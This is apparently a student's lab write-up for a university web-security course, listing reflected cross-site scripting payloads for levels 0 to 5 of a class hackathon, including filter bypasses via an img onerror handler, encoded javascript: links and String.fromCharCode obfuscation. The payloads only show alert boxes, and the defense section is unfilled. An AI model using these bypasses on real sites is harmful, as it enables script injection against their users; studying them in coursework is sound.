# WAPH-Web Application Programming and Hacking

## Instructor: Dr. Phu Phung

## Student

**Name**: Sophia Munoz

**Email**: [mailto:munozsa@mail.uc.edu](munozsa@mail.uc.edu)

![Sophia's headshot](../../images/headshot.jpg)

# Hackathon 1 - Cross-Site Scripting Attacks and Defenses

## The Lab's Overview

For Hackathon 1, there were two tasks.

Outcomes I learned from this hackathon were...

Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1](https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1).

### Task 1: Attacks

#### a. Level 0

`<script>alert("Level 0-Hacked by Sophia Munoz")</script>`

![Level 0 Injected XSS and Payload Attack](../../images/level-0-attack.png)
*Level 0 Injected XSS and Payload Attack*

#### b. Level 1

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`

![Level 1 Injected XSS and Payload Attack](../../images/level-1-attack.png)
*Level 1 Injected XSS and Payload Attack*

#### c. Level 2

Assuming the method used was the `POST` method. The vulnerability is exploited in the `echo.php` web application on this line of code: `echo $_POST['input']`

```html
var f = document.createElement('form');
f.method = 'POST';
f.action = '';
var i = document.createElement('input');
i.name = 'input';
i.value = '<script>alert("Level 2-Hacked by Sophia Munoz")</script>';
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

![Level 2 Injected XSS and Payload Attack](../../images/level-2-attack.png)
*Level 2 Injected XSS and Payload Attack*

#### d. Level 3

Assuming the method used was the `GET` method. The vulnerability is exploited in the fact that only `<script>` and `</script>` were filtered out, but other event handlers like the one used to inject in the URL \(`onerror`) weren't handled at all.

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=<img src=x onerror="alert('Level 3-Hacked by Sophia Munoz')">`

![Level 3 Injected XSS and Payload Attack](../../images/level-3-attack.png)
*Level 3 Injected XSS and Payload Attack*

#### e. Level 4

I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL parameter separator. Assuming the method used was the `GET` method. The vulnerability is exploited by a line like `echo $input`. Even `script` wasn't detected as it wasn't a literal letter-for-letter string.

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=<a href="java%26%23115%3Bcript:alert('Level 4-Hacked by Sophia Munoz')">Click Me</a>`

![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
*Level 4 Injected XSS and Payload Attack*

#### f. Level 5

I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,105,97,32,77,117,110,111,122,39,41))>`

![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
*Level 4 Injected XSS and Payload Attack*

#### g. Level 6

Guess the core source code of the `echo.php` web application \(where the vulnerability is exploited)

**i** injected XSS to display name using alert\()

**ii** payload of the attack inspected in the browser

### Task 2: Defenses

Review and revise your vulnerable, insecure code in Lab 1 and Lab 2 by implementing input validation and XSS defense methods in:

- echo.php (from Lab 1)
- Current front-end prototype (Lab 2) (12 pts): identify external input data channels, where you must validate the data before using it, and encode the data before displaying/injecting in the front-end interface, i.e., webpage

For each revision, commit and push the code to GitHub with an appropriate message, and capture a screenshot on GitHub of that commit to illustrate the code revision \(GitHub -> Code -> xx commits -> click on the commit you revised the code). The expected screenshot is illustrated in Lecture 8 and the attached slides.
